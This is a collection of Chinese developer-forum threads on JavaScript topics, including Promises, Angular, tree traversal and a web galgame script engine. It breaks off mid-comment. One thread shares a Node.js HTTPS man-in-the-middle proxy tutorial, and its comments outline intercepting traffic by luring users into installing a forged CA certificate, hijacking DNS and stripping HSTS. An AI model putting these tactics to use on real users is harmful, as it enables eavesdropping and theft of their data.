{"content": ["<div class=\"topic_content\">目前在看 promise 章节， promise 的基本概念和基本操作我都理解了，但是我不理解为什么叫 promise 是 js 的异步编程，关于 Generator 可以看作一个断点式的执行函数，但是和我在 java 或者 C 上的多线程还是有点不一样就是，这个另外说了。\r<br>\r<br>promise 可以实现异步操作结束后，将异步操作的结果传递出去。我在这些概念和使用 then ， catch 之类的操作上感觉， promise 是一个线性的单线程操作，并没有什么多线程的操作，可能有人说阮一峰的教程里面有一些关于 promise 的 demo ，我也用 nodejs 实现了关于读取文件这个操作的异步，但是我不理解的是如何实现了这个异步操作的，因为使用了封装的模块。\r<br>\r<br>写到了这里我感觉我可能哪个地方理解有错误，总感觉 C 的多线程和 es6 的异步概念上有所不同，我也查了关于 js 的多线程有人说使用 settimeout 来实现，但是那种也是一种伪装的单线程操作。以及还有 web worker 这种完全的多线程操作但是好像 web worker 只能执行一个 js 文件我感觉挺麻烦的。\r<br>\r<br>那么求问 promise 该如何理解， promise 里面写着的操作并不是由 js 自动进行异步操作的，还是异步操作是自己写的？又或是 js 的异步并不能和 c 一样做到两个循环轮流执行只是断点式的执行？</div>"], "reply": "18", "tittle": "冒昧提问关于 ES6 的 promise 的一些问题", "comment": ["建议先了解 Node 的事件循环，异步能力本身是由引擎（或者 Node.js 里的 C++ Addon ）提供的，引擎会在进行 IO 操作时接受一个回调函数，然后再在 IO 完成时调用它。如果不借助引擎的能力， JS 本身是做不到异步和并发的。\r", "\r", "Promise 只是帮助开发者更好地管理异步任务（我认为最大的价值是简化了异常处理），是可以用纯 JavaScript 来实现的， ES2015 把 Promise 加入了标准中。", " 也就是说，纯前端并不需要深入了解 promise 的使用？如果这样的话我就简略看掉吧，感谢回答", "Promise 的概念确实有点绕，自己不用框架写一个简单的 Promise 异步编程，理解了之后，还是用 async/await 吧。", "“異步”和“多線程”是完全不同的概念，二者間並無必然的聯繫。\r", "\r", "\r", "\r", "“ When you execute something synchronously, you wait for it to finish before moving on to another task. When you execute something asynchronously, you can move on to another task before it finishes.” \r", "\r", "僅此而已。\r", "\r", "很多現代前端框架使用 Promise 。 ES7 的 async/await 語法也和 Promise 有關。你應該深入了解它。", " 我的问题主要在于 promise 如何和异步协作或者本身进行异步，加上前面那个 Generator 概念一混淆头就发热了，而且没有合适的 demo 去说明", "异步不等于多线程， js 是单线程的。你发起一个 ajax 请求后用写一个死循环，你的回调永远不会被执行。 js 的异步是借助操作系统提供的事件(通知 /轮询)来完成的。", " 看来我对于异步的概念还并不是很清楚，感谢提供思路和建议", " 看来还是异步和多线程概念上踩坑了，感谢回答，因为当初做过简单的 Java 开发使用过多线程进行网络通信误以为异步=多线程", "Promise 是需要深入理解的，否则到时会寸步难行。\r", "\r", "Promise 代表的是未来的返回值，在 Promise 创建时，动作已经开始执行；当动作结束是， then 里的方法会被调用。\r", "\r", "Promise 可用来做并行操作，在此安利一个我写的库，用于并发执行指定数量的 Promise ，不传参数的默认动作是串行 Promise ，即第一个 Promise 内动作结束后才开始下一个 Promise 。\r", "\r", "\r", "\r", "如题是 coffeescript 写的，想看 JS 版只要 coffee -c 转一下就好了。", "异步和多线程没关系\r", "异步只是充分利用单线程（当前线程应该更准确）", "当然，你学一些 FP 以后就会知道， Promise 只是一个 Monad 而已。", "1.异步跟多线程没关系。\r", "2.async await 是把异步的东西弄成写起来像同步一样。\r", "3.promise 是个能往函数里传，也能从函数里返回的东西。当你从这个角度看 promise 的时候，它就不只是一个语法糖了。有人说 promise 是为了解决回调地狱而出现的，那是瞎扯淡。\r", "4.想真正利用好异步，还是得靠 rx 。", "我也有过类似的困惑，读过一些 Promise 实现后清晰了很多，试着回答一下。\r", "\r", "当我们编写异步代码时主要跟两个东西打交道：异步 API 和回调函数。当你的程序只有一个异步调用时，你肯定可以轻松应对。但当你的程序有 N 多个异步调用，并且相互直接有着复杂的关系（多个异步调用同时发出？顺序发出？有一个失败了其它的怎么处理？）时，你的代码将充斥大量的控制变量，你感觉你已经进入了 callback hell 。更恐怖的当有人读你的代码的时候，他会感觉像吃屎一样难受。\r", "\r", "这个问题大部分语言都存在，只不过 JS 更受关注，人多嘛，再加上 WEB 程序天生就面对大量异步网络请求。\r", "\r", "所以， Promise 只是一个解决异步相关问题的“框架”，它帮你梳理异步操作模型。用它写出来的代码可读性高，容易理解，仅此而已。", "   这理解写的挺详细的", "似乎楼主是想了解 js 异步的实现原理，而不单单说 Promise/A+ 模式吧，看起来对于 ES6 的 Promise 语法楼主已经很了解了。这方面我一直也有困惑，在浏览器端（比如 AJAX ），异步的底层实现似乎是依赖浏览器的多线程机制的，那在 Node 端呢？  看到的解释都是 EventLoop ， EventLoop 只能解释 setTimeout 啊（在一个线程上，延迟加入队列），对于文件读取这种异步怎么解释？？  智商捉急 同样求解答....", " 当你调用 readFile 函数，实际上最终完成功能的是系统调用 read/fcntl 之类的函数。这类函数可以让你的 readFile 立刻返回，并且当读完数据后可以通过某种机制通知 JS 来回调你的 callback 。这个异步是 IO 的异步，想更深入了解 IO 异步原理，可以看看 APUE 的第三章和第十四章。", " 谢谢  明白点了 ，至少明白了都是通过某种通知机制来调度的，我去看看 谢谢。", "其实也可以多线程啦。不过跟 promise 没啥关系，毕竟它只是用来处理能串起来的操作。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近有个中等复杂度的项目（内部管理系统，二十几个页面，有些是单页就有十几个 input 的表单）需要用到前端框架，老板给的时间不多，只有 2 到 4 个礼拜，包括写后端（是的，我也负责写后端）。</p>\n<p>鉴于自己只有 Angular 1 的经验，就算自己想用 React 或者 Vue ，但考虑到学习时间成本，不敢贸然去学习新框架，所以选了 Angular 2</p>\n<p>之前看过 Angular 2 的代码， 的确和 Angular 1 很不同， 但实际写起来并没有自己之前想象那么艰难，花一两个小时时间熟悉下 Typescript 格式和新的 app 结构，也可以很快上手，写个中等难度的 app 也可以很快。如果说要花时间，那就是如何优化或者有些坑要踩。</p>\n<p>如果说有什么担心的话就是 Angular 4 很快又要出来了，到时项目升级的话又要花不少时间，这也可能是 V 站人推荐 React 或者 Vue 主要原因之一吧。现在只能尽可能地多写测试特别是 e2e 测试，先上车再说...</p>\n</div></div>"], "reply": "15", "tittle": "会 Angular 1， 学 Angular 2 并没有想象中那么难", "comment": ["有 angular-cli 省不少事呢", "我还想问楼主会 angular1 学 3 难不呢？没想到都有 4 了", " \r", "嗯呀， 2 很多方面比 1 更方便，值得升级", " \r", "其实没有 3 ， 为了版本对齐直接到 4", "ng2 整体来说是可以的，除了除了频繁的版本升级导致周边库报错比较麻烦", "写 e2e 不如自杀，真心的", " 之前记得有人说过下一年就出版本 3 的，为啥现在又成四了？顺便问一下啥叫版本对齐？", "e2e 真的是一件很痛苦的事情", " 路由废弃了一个大版本，导致现在路由领先了。所以直接统一到 4 上。", "不过基础语法应该不会在变了。", "angular1 就是九阳神功，会了后学什么都快，相反 react 有点像九阴真经，学了后很容易走火入魔", " \r", " \r", "我没有太多写 angular e2e 的经验，我做后端 php app 的时候是用 phpunit 配合 selenium 写。 如果说痛苦，是不是指要适当的使用 async await 之类的？", " e2e 需要一条线路一直走下去 稍微复杂点的逻辑 就是 n 多条线路", " ", "嗯呀 的确 因为不是 unit test 所以基本上每一个 test 就要走通一个 use case 有分支还要在走一遍 每个测试都比较花时间", "是要真的“会” Angular 1 ，才能很快的转 2", " Angular 1.5 以后的组件概念和 Angular 2 很接近，有同样的 Component LifeCycle, $onInit, $onDestroy, $doCheck, $onChanges ， Angular 2 （本身支持用 JS ， Typescript ， Dart 来写） 使用 TS 的话，更简单，实现相应的接口和方法。。。对于有 Java ， C#基础的 Angular2 （ Typescript ）更容易上手。\r", "\r", "Angular1 组件开发， ", "\r", "Angular2  Sample （大约半年前开始尝试用，假期中会重新更新）， ", "\r", "\r", "Angular 2 最好的用 Angular CLI 来创建，支持升级。", " ", "谢谢详细的回复，已经 fork 了 ng2 sample repo. ", "手头上的项目会用到 jwt 和 testing 希望到时能贡献些代码"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>两个运算符以string形式输入</p>\n</div></div>"], "reply": "13", "tittle": "如何优雅地判断输入的两个运算符（仅限于+-*/）的优先级？", "comment": ["目前想了一个比较蛋疼的实现方式\r", "table ，然后直接查表", "二维数组", "逆波兰表达式，遇到*/就出栈计算", " 我就是在参考 ", "\r", "实现中缀式转逆波兰式。。。", "给每个运算符指定一个数字，然后比较数字大小，多简单", "直接构造一个 map 记录每个操作符权值  然后相减啊\r", "\r", "```js\r", "function compare(op1, op2){\r", "    var weightMap = {\"x\":1, \"/\":1, \"+\":0 ,\"-\":0 };\r", "    return weightMap [op1] - weightMap [op2];\r", "}\r", "```", " 是在下输了", "写好测试例子，然后 eval 不就可以了。比如：\r", "\r", "> eval(\"1\"+\"+\"+\"2\"+\"*\"+\"3\")\r", "7\r", "\r", "说明是 * 优先级高。", "if else(或 switch case)，没有比这个更优雅的了，上面的回复都是画蛇添足。", "在学编译原理？\r", "\r", "定义个 运算优先级表", " 6", " 和 @", " 都是可以的。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如我有一棵树，树上有些节点是让用户决定的变量。\n如果没有限制就是一路 dfs 执行到底。\n但是有时候根据用户决定的值一些子树不能进去。\n最蛋疼的来了，用户点一下鼠标，往下执行一下，由于是前端，要考虑交互，鼠标点击是与函数绑定的，处理一句就要跳出函数，然后递归往前进一步还是什么。总是感觉好蛋疼。</p>\n</div></div>"], "reply": "31", "tittle": "怎么利用 js 在树上交互", "comment": ["所有你需要事件委托代理？", " 我定义了一种制作 web 上 galgame 的语言，然后用 c++翻译成 js ，单线流程我已经试验成功了（链表），但是加了选项之后就是树结构，按理说差不多，但是我不知道每次调用监听函数怎么知道自己在树上跑到哪里了以及之前跑过哪些点，怎么回溯。。\r", "事件委托代理是监听给父元素？不过我这个问题和 DOM 关系好像不打。。望大佬指点。", " 其实主要是回溯蛋疼，，其他的可以标记", "用一个栈模拟 dfs ？", " 对的。。。可以先预处理到栈里，之后就很好写了。。感谢大佬", " 不对应该是运行一个语句丢一个到栈里。。我数据结构学炸了。", "我看标题还以为爬到树上用 js 搞智能硬件。。。", " 应该是我误会了，纯前端，没能理解需求。", "其实就是 dom 树？\r", "\r", "有 childElements 和 parentElement 就可以了吧，大不了再搞个 siblingsElement", "dom 树的这种数据结构是啥，表示没大学没上过课不知道怎么表述..\r", "\r", "不过按照你的要求可以回溯，在生成树的时候加个 parentNode 完全可以搞定了吧", "还以为你们两个人蹲在树上写 js 。。。。", " 大概就是我有很多要执行的语句，树上每个节点都有一句，有些是给用户决定赋值的，有些就是给用户看的。然后用户点击一下鼠标往后执行遇到有 stop 语句停下来，有些节点根据某些值决定进不进去。。。如果没有用户实时决定就是讲编译的书上前几章讲的 ast 树，，在一般的 ast 树上兄弟之间加单向边用栈模拟应该效果差不多。。", " 我整个网页就一个元素<div id = \"game area\"> </div>。。。我指的就是普通的树，，", " 你说的是 DFS 的树？好多人都以为是 DOM 树。。", "歪楼，建议找个梯子，上树方便", " 要不试试用生成器函数？", " \r", "\r", "我说的就是你的数据结构做成 dom 树那种结构就能满足你的需求，前提是你明白 dom 树的结构是啥样的。。\r", "\r", "在任何一个节点都可以通过 parentElement 向上找，也可以通过 siblingsElement 找兄弟节点，同样也可以通过 childElement 找子节点", "说的好像 DOM 树就不能用 DFS 算法似地...", "yield ？ 或者手动实现一个 coroutine ？", " 我用的一个叫做 pixi.js 的图形库。。。没有看过源码，，不知道内部怎么实现的。。它给的样例就没能让你操纵 DOM 树，只让你在一个框框里面加东西。。", " 而且它也是用一个叫做 webGL 的东西弄得，我不明白原理还是调用它的 api 比较好吧。", "返回一个函数就可以了", " 其实这种翻译成 html 再用 js 去控制好很多，，，就是不知道不调用图形库就靠 css 能不能做出游戏的效果。。", " - -。我说的 dom 树，是一种数据结构，不是真实的渲染出来的节点。\r", "\r", "因为我没学过数据结构这门课，不懂怎么表达。其实按照你的需求...回溯而已，给子节点上加上一个反向的父节点再加一个 nextsiblings 就完了。 start 的时候就是从 root 节点找第一个子节点，每次经过的时候标记当前节点\r", "1. 子节点都判断自己是不是叶子节点，如果是，就找 nextsiblings ，再回到 1\r", "2. 如果不是，就找子节点，如子节点已经被标记了就找 nextsiblings\r", "3. nextsiblings 被找完了，就找上层父节点的 nextsiblings ， 再回到 1 开始\r", "\r", "直到找完", "同样暂停再开始就是重复上面的步骤而已", " 您的意思是监听用的函数返回搜索的函数？", "简化的数据结构就是 \r", "\r", "node :  {\r", "   parent: node,\r", "   nextsiblings: node,\r", "  children: [node.......],\r", "  marked: true\r", "}", "要跳出函数并且保持运行状态自然是用 generator 和 yield 咯，用户点一下再继续回到函数里运行就好，不用自己记状态，方便得很", " 对啊对啊 但是如果环境支持 generator 的话 generator 是不错的选择", "把 .next() 写成 await .next()不就好了...", " \r", " \r", " \r", " \r", "感谢大佬们，这东西用起来爽到不能自己。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>//  Uncaught ReferenceError: a is not defined\nconsole.log(a)\n</code></pre>\n<pre><code>// undefined\nconsole.log(window.a)\n</code></pre>\n<p>全局作用域下, 这两个不是同一个东西吗? 为什么读取时得到不一样的结果.</p>\n<p>另外, 我刚发的帖子在帖子列表里都是2天前, 这是被v2降权还是系统 bug?</p>\n</div></div>"], "reply": "1", "tittle": "请问, 为什么访问\"未声明的变量\"会抛出错误, 而访问\"不存在的对象属性\"会得到 undefined?", "comment": ["其实还是不一样的，你可以用 delete 操作符试试，前者无法删除，后者可以删除"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的问题:</p>\n<ol>\n<li>我想弄一个网站，用户上传脚本，然后我翻译之后返回给他一个 js 的链接，然后他自己引用。问题就是我的代码用到了一个叫做 jquery 的基础库和一个叫做 pixi 的图形库可能之后还会有声音库，那么有没有办法让帮用户使用这些依赖呢或者还是告诉用户让用户自己去搞？</li>\n<li>用户成功用了我这个东西之后，游戏资源是到我服务器获取好还是让他自己去获取好？那么 js 资源的获取该怎么写？</li>\n<li>虽然本地跑的不慢，但是网络上可能出很多问题，可不可以做到先把游戏隐藏跑一段时间再返回去让用户玩呢？</li>\n<li>如果用户提交上来的脚本一点问题都没有，那么一定没什么问题。如果提交上来的有问题，我能想到的情况有限，错误提示有没有方便的办法去做呢？</li>\n</ol>\n<p>我是 web 新手， js 都是当 c 来写的。。所以有些问题可能大佬们看起来比较白痴，但是你们的一点点帮助可能对我提高很大，谢谢。</p>\n<p>这是我定义的语法:<br>\nbg.島_坂道_差分(夕方)|jpg<br>\nmiddle.chrysoA_a|png<br>\ndialog.\"???\".\"ass we can\"<br>\noption2.\"肛\"|flag1.\"不肛\"|flag2<br>\nclick<br>\nop.flag1{<br>\n  dialog.\"???\".\"boy next door\"<br>\n  click<br>\n  middle.clear<br>\n  bg.図書館２階_隠し書庫_白黒|jpg<br>\n  dialog.\"\".\"deep dark fantasy\"<br>\n  click<br>\n  des.\"菊花好痛\"<br>\n}<br>\nop.flag2{<br>\n  middle.chrysoB_g|png<br>\n  dialog.\"???\".\"interesting\"<br>\n}<br>\nclick</p>\n<p>然后对应的界面<br>\n<img alt=\"\" src=\"http://studioflaming.cn/usr/uploads/2017/01/174272284.png\"><br>\n<img alt=\"\" src=\"http://studioflaming.cn/usr/uploads/2017/01/1518640306.png\"><br>\n<img alt=\"\" src=\"http://studioflaming.cn/usr/uploads/2017/01/2401535731.png\"><br>\n<img alt=\"\" src=\"http://studioflaming.cn/usr/uploads/2017/01/3145327214.png\"><br>\n<img alt=\"\" src=\"http://studioflaming.cn/usr/uploads/2017/01/3538564357.png\"><br>\n<img alt=\"\" src=\"http://studioflaming.cn/usr/uploads/2017/01/3910630330.png\"></p>\n</div></div>"], "reply": "36", "tittle": "在制作一个做 web 上 galgame 的脚本(？)，想请教大佬们几个问题。", "comment": ["> 然后我翻译之后返回给他一个 js 的链接\r", "\r", "那直接返回一个 html 不是更好么", "感觉可能做一个 js 库就可以了吧。也可以考虑打包成一个 exe 丢到 vps 上暴露一个端口来服务的方案。感觉主要取决于你希望运行环境有多灵活了。如果是对服务器环境没有假设的那种可能就是一个 css 库加上 js 库吧。", " 我是想能够插入用户的网页中，如果直接返回网页大概是怎么做。", " ？", " 您的意思就是让用户自己去改吧", " 额，我加入绘图库就是为了之后更新可以加入一些特效的，比如柚子社常用的上下动一下，些许之后还能插入一些小游戏的。。", " 自己再改改喽= =", " 看了一下，，他写的那么少怎么处理分支嵌套的情况。。。", " #8  ", "  朋友博客在用，具体实现我也没了解过", " 我解释器是 c++写的，有没有什么办法达到相似的效果呢？", " 我知道了，他这个东西，如果分支之后，，相同的东西全部要重新写，，他是处理 json 的数据，，我是按照传统的解析器写的，，，小游戏用他的很方便， json 相关的工具非常多。。但是游戏流程稍微长了，工作量就会大很多。。", " 我是用 c++写的，是把脚本翻译成 js 的。我就是想按你的说法给别人调用。但是最理想的效果就是你说的一个库的效果，但是对于不同的脚本，翻译出来的东西是不一样的。可不可以对于每个翻译出来的文件制作一个库呢？大概怎么实现呢？", "直接返回一个 url 吧，让用户用 iframe 嵌到自己的网页就可以了", " iframe 的作用是不是一个 html 文件可以插入到另一个 html 文件？那么我就把游戏资源放在我自己的服务器上。 localhost 上看的是什么样，对面引用看的也是什么样？", "自定义语法都是多余的，踩过坑的人都知道没有编译原理基础自定义语言是多(zhui)痛苦的\r", "所以如果你不知道用什么语言，就用 lua 吧", " 但是这个东西只有 if 啊。。。而且实现脚本语言本来就不需要多少编译原理的知识，，弄个 ast 树搜索一下就出来了。", " 而且就算是编译性的语言，也有非常多的工具来帮助你实现，你要做的也就是词法分析语法分析这些编译器前端工作，和专门的编译工作不是一个概念。。", " 新手么，不知道怎么拟定需求，总以为什么都很简单，等后面逻辑复杂了就知道加功能多困难了\r", "所以我的建议是不知道嵌入什么语言就用 lua ，不知道什么语法就照着 lua 做， lua 那么多游戏做嵌入式引擎不是没道理的", " iframe 的作用是引用一个网页， html 和资源放在你的服务器上，把 html 的地址给用户就可以了，用户在他们的页面上添加一个 iframe 把你的网页引用进去就可以了", " 真的不是觉得很简单，是我就没想做难，能够跑个分支就行了，而且一个 if 语句主流语言全都是这么实现的。而且我问这个问题是我已经做完可以用了，然后想让别人能够方便用并插入网页中，我自己不做游戏（不会画画）。 lua 的作用很多，我不知道对于我现在这个情况怎么在网上搜索相关的资料。", " 那就是我要的效果，在给用户做个上次资源的界面应该就可以了，感谢大佬，一楼那位大哥估计也是这个意思，就是我太菜没看懂。", " #17 如果你能把握你的需求就局限于这个 if 的话，确实自己实现个能满足需求的脚本也挺不错的，起码效率上应该会比绝大多数的脚本语言高。但是我觉得大概率，后面你会有更多的需求。", " 我现在的需求都是特效方面的， cpp 文件已经不用改了，改改 js 就行了。而且 avg 这种东西没看到在流程上有什么新花样，都是玩特效，撑死加个还是 if 的好感度。我反正没这个能力在 avg 游戏上做出创新。我本来就是做个 0 门槛脚本给别人用，不可能就像上面那个哥们说的直接跟客户讲 lua 好用你去学 lua ，然后除了 lua 有学了一堆东西。至于效率，翻译和运行都是 O(n)的。但是你说的这些和我问的问题关系不大。。", "说起来你们还喷楼主不会拟定需求，先完成楼主需求再说啊。不管这个写的合不合适。\r", "1.的解决方法可能可以采用一些讨巧的手段，网络上有公共的 jquery 的 cdn ，可以直接引用这个链接。\r", "2.肯定是让他自己获取比放到你服务器好，至于怎么获取，我不是前端我不知道，这个问题丢给用户去把： P\r", "3.基本游戏都是这么做的，开始前一段 Loading 加载资源。你多增加一个 loading 场景就好了。\r", "boy next♂door", "第一遍看代码我以为是乱码", " 你肯定不是黄油玩家，这玩意是我找几个资深黄油玩家问出来的。", "回问题\r", "\r", ">>>1.\r", "我的想法是，先在前端检测用户嵌入的页面上，检测是否存在这些外部依赖，没有的话就操作 DOM 帮用户导入\r", "\r", "例如检测 JQuery\r", "\r", "if (typeof jQuery == 'undefined') {\r", "    var script = document.createElement('script');\r", "    script.type = \"text/javascript\";\r", "    script.src = \"JQUERY CDN\"; //replace jquery cdn url here\r", "    document.getElementsByTagName('head')[0].appendChild(script);\r", "}\r", "\r", "\r", ">>>2. \r", "Game Assets 千万别让用户上传到游戏服务器，一是空间二是频宽三是安全性问题。\r", "\r", "定义好 assets 存放的路径配置方式，在文件中解释即可\r", "\r", ">>>3. \r", "用状态去控制，当某阶段的资源完全读取完毕後，在进入该游戏阶段\r", "\r", "效果应该能近似於\r", " [进入一个新的游戏阶段] -> [画面提示 loading] -> [该游戏阶段开始]\r", "\r", "\r", ">>>4. \r", "做个用户後台如何?\r", "\r", "用户操作後台使用该服务，提交丶显示结果等等也都在该後台操作\r", "\r", "<del>还可以插点广告赚赚资费</del>\r", "\r", "\r", "题外话\r", "\r", "我也有试着弄些 JS\r", "\r", "将一些游戏引擎常用的开发习惯搬到网页上，想迅速产生 SPA\r", "\r", "这是一个初始概念的 DEMO:\r", "\r", "\r", "\r", "不过弄着弄着发现这梦太美，会遇到各浏览器差异性带来的问题\r", "\r", "处理起来会很坑\r", "\r", "懒癌发作就放着了", " 那个 galgame 的引擎要多少有多少， vb 差不多的语法，认识一个人都开始出作品卖碟子了\r", "这东西拼的技术？拼的剧情？ NONONO ！还不是谁的小姐姐好看\r", "需求这东西，现在都 2017 年了，你能想到的别人早做完了\r", "为什么要前端呢。。你前端要处理多大数据加载量啊，每张都是图还动不动要加音视频或者语音的", "重复造的不是轮，是浪漫\r", "\r", "大型资源，如长达十来分钟的背景音乐，才会需要特别在後端处理分割，前端延迟加载\r", "\r", "背景图片丶人物立绘或人物语音，大小通常不大，随着游戏阶段加载资源就好了\r", "\r", "DMM 上有蛮多 HTML AVG 页游的， LZ 可以去看看他们的一些处理方式", " 国内做相关引擎的我只服面包组，您那位朋友是哪位大组的啊，国内比较出名的制作组据我所限的知识也没见到哪个是自研引擎啊。而且 web 相关的都是 flash ，但就算有了和我什么关系。而且我为毛要在 web 前端搞事，就是为了学 web 前端。我是一个码农，我只能做好自己的事，而且我还没开始工作，放假没有其他事情做，闲着还不如撸这个。\r", "前端圈子里明显热心，学到不少。像您进来就说些莫名其妙的话然后各种不行的前端我还是第一次见，毕竟不管有没有用，思考问题本身对于程序员就是有意义的，不是么?至少在大佬帮助下，这玩意就算其他人不能用，我方便自己和朋友做一个小东西插入到自己网页上也是可以的吧。", " 我本来就是抱着学习的心态来做这个的，那位大哥说你白搞了，数据库、编译器之类的基础设施都有那么多种。按他的想法就是，大一的学生到了学校，老师直接说，大家别学习了，和我去搞量子计算机吧，其他的东西都被别人搞烂了。", " 撸个解释器要毛编译原理……有几个人喜欢作死倒腾上下文相关文法？\r", "要是光论语法…… Lua 比起 SICP 上的玩具都是一坨呵呵。当然大多数比 Lua 更作死的就不用提了。", " 都是搞过前端的，才不忍心你上来就被坑，造轮子之前先学会用轮子，以前也是懵懂的时候写过组件，后来发现就一坨屎，原因很大一部分就是不懂需求，结果做做改改搞出一坨无法维护的代码\r", "\r", " 按照前端优化理论声音和图片都要压缩的，但是对于 galgame 这不行啊，你把图片和音频全压了撸点就没了。。\r", "\r", "什么需求用什么技术，前端不是万能的，我希望你懂这点，前端现在太浮躁了，啥都想用 js 开发", "既然你想要建议，那我就直说，你这个文法的可读性就是 0 ，为什么把 click 也放进去呢？看上去跟按键精灵一样\r", "标准化是什么意思，选择了前端就优先考虑 json ，或者长得像 json 的，或者跟 html 、 css 这些搭边的\r", "我把你的语法改了一下 不仅流程清晰了很多 还可以轻松加扩展\r", "不太建议造轮子啊...\r", "\r", "有 novelsphere （ ", " ）又有面包工坊在做的 AVG.js... 都直接兼容 KAG 脚本了，感觉几乎没什么可以改进的；要说脚本语言的简洁度， ren'py （ ", " ）的语法也够了，很难再简洁。\r", "\r", "如果想吸引人来用的话感觉一个是稳定性一个是自己的游戏平台，这些比语法重要得多。\r", "\r", "\r", "正经答问题：\r", "\r", "1. 按你的设定应该是用户来搞了，但是只返回 js 没看出有什么好处，还不如给用户一个网页；\r", "2~3. AJAX 后台加载；\r", "4. 没啥好方法，说不定得（像大多数 gal 引擎一样）做一个编辑器...\r", "\r", "\r", "说实话，语法的设定让我眼前一亮（有点结构化的感觉很棒），但是有几点建议...\r", "\r", "- click 之类的最好不要单独写成命令，实际游戏里几乎每句之后都要点击，都写出来就太多了\r", "- 对话的名字部分也可以先用类似变量的东西存着，毕竟每句都要把主角姓名打一遍很是麻烦\r", "\r", "总之就是减少重复性的内容啦。你可以先参考一下各大引擎的脚本语法，提炼出不足，然后集中改正。\r", "\r", "\r", "以上只是我自己的建议，请不要太介意 ><", "我瞎写的。。。。\r", "\r", "资源\r", "一堆图片、音频，可被模板 / 页面复用。\r", "\r", "模板\r", "一个界面状态，比如“显示人物 xxx 在旁边的对话框，有两个选项”，界面上的按钮、嵌套关系等等都用 XML 描述，可被复用。\r", "\r", "页面\r", "继承一个模板，然后添加详细内容，比如“对话框的内容，选项 1 是肛，选项 2 是不肛”，唯一 ID 就是文件名，被流程树调用。\r", "\r", "流程树\r", "主体逻辑，显示页面，接收页面的返回值，判断、处理等等，显示下一个页面。\r", "比如\r", "    ptest_result = ShowPage(\"page_test\")\r", "\r", "    if(ptest_result = “ gang ”)\r", "    {\r", "          ShowPage(\"page_gang\")\r", "    }\r", "    else{\r", "          ShowPage(\"page_bugang\")\r", "    }\r", "\r", "直接写 JS 多好\r", "\r", "用户写好后把模板、页面、流程树， zip 压缩上传，服务端编译，打包成 zip ，用户下载解压，放入没上传的资源文件夹，打开 index.html 即可玩。\r", "或者做一个游戏平台，全部上传，产生一个唯一链接，全部托管到服务器。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>基于 Node.js 的 HTTPS MITM(中间人)代理的原理和实现</h2>\n<p>分享自己写的一篇关于 HTTPS 的技术博客</p>\n<p><strong>地址</strong>: <a href=\"https://github.com/wuchangming/https-mitm-proxy-handbook\" rel=\"nofollow\">https://github.com/wuchangming/https-mitm-proxy-handbook</a></p>\n<p><img alt=\"\" src=\"https://dn-cnode.qbox.me/Fgort_dd1OILWAPnaa0wK8itZlgq\"></p>\n<p>部署在公网的服务面临着越来越多的流量劫持、运营商劫持事件，为了能更好的保障信息的安全性和完整性， HTTPS 得到了越来越多的重视。基于此原因，本文章尝试从另一个视角，通过使用 Node.js 实现一个简单的 HTTPS 中间人代理的方式，阐述 HTTPS 是如何保证网络信息的安全，并且分析用户的何种行将会导致 HTTPS 的安全性失效。</p>\n<p>MITM （中间人）代理的技术手段对于软件开发者并不陌生，在实际开发和测试中经常会使用。调试接口、查看 HTTP 请求与响应时使用的 http 抓包调试工具如： Fiddler 、 Charles ，就是基于该原理实现的。</p>\n<p>本文会更侧重于代码的实现，每一步都提供详细的、可运行的 js 代码实现。</p>\n</div></div>"], "reply": "17", "tittle": "分享：基于 Node.js 的 HTTPS MITM(中间人)代理的原理和实现", "comment": ["谢谢分享！", "很有帮助，非常感谢！", " ，谢谢！", "????黑人问号", " ，没太懂，什么意思？", "一般而言的 MITM 不包括正向代理\r", "当然为了调试的目的也可以在正向代理上附加 MITM\r", "如果你想做 MITM 的普及，应当实现一个反向代理 + DNS 污染", "如何取得“信任”\r", "\r", "回到最初的思路分析：建立一个可以同时与客户端和服务端进行通信的网络服务。\r", "\r", "现在需要解决的是如何得到客户端的信任，才能建立与客户端的通信。经过上面的分析，突破口就是 CA 证书。只要自定义的 CA 证书得到了客户端的信任，我就能用 CA 证书签发各种“伪造”的服务器证书。简单说就是让客户端系统安装上我们自定义的 CA 证书。\r", "\r", "这算不上 mitm 了，都能给客户端安装 ca 证书了，啥不能干。思路应该是中间设备劫持 dns 和第一次 http->https 的 302 跳转，让客户端和中间设备保持 http 通信，同时剥去来自服务器端的 hsts header 。对于客户端已经被告知 hsts 的站点无效。", " 这就是 mitm ，只不过能取得客户端的信任。\r", "HTTP 的劫持也是中间人，只要你和服务器的通信被第三方修改过或嗅探过，就属于被中间人。", "https 劫持的话，就算去掉了 hsts ，然后代理。我也能插随机 js 跳回去，再加上 cookie secure ，不太可能破解。", " ，想说的就是装了 CA 证书什么都能干 ：）。对于一般用户他不知道什么是 CA 证书，被诱导安装上自定义的 CA 是很容易的。\r", "\r", "另外，“ https 剥离”我觉得更应该叫 http mitm ，因为全程和 https 都没什么关系。\r", "\r", " ，一个完整的 hack 方案确实是要包括流量劫持，但这里想讲的只是 HTTPS 的证书链，所以就用最简单的正向代理的方式。", " ，随机 js ？", " 垃圾 12306 还在用自签的，估计已经不少人被装了不明来路的 ca 证书。", " 只信任那一张证书就可以了，不需要信任 12306 的 CA", " ，但一般用户其实不知道 CA 是什么，会留下安全隐患", " 一般用户连 https 都不知道 ┑(￣Д ￣)┍", "非一般用户不就没辙了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>偶尔有人说我的网站 QQ 浏览器有问题，我没当回事，因为我用别的国产浏览器都没事，我想可能是国产 Android 太乱的原因，直到我今天试了下，发现：</p>\n<pre><code>const res = await fetch(...)\nres.ok === undefined\n</code></pre>\n<p>系统提供的<code>fetch()</code>竟然少了<code>ok</code>属性。</p>\n</div></div>"], "reply": "11", "tittle": "QQ 手机浏览器很坑爹啊， fetch() 竟然没有 .ok 属性", "comment": ["X5 是微信安卓的内核，如果你不兼容那微信上就有问题了", "fetch 毕竟还不是正式标准，如果要用还是建议用一个库", "fetch 要在 x5 内核跑引入很多 polyfill 但是肯定跑的起来的", " @", " \r", "顺便问下 Promise 的话用 babel-polyfill 还是 es6-promise?", " 用 babel 吧，个人感觉已有正式标准 api 的 polyfill 非必要情况不应当出现在业务代码里", "用 polyfill 呀", "这东西 safari 就不支持，移动端只有 edge 支持……", " 当然是有 polyfill 的，不过 polyfill 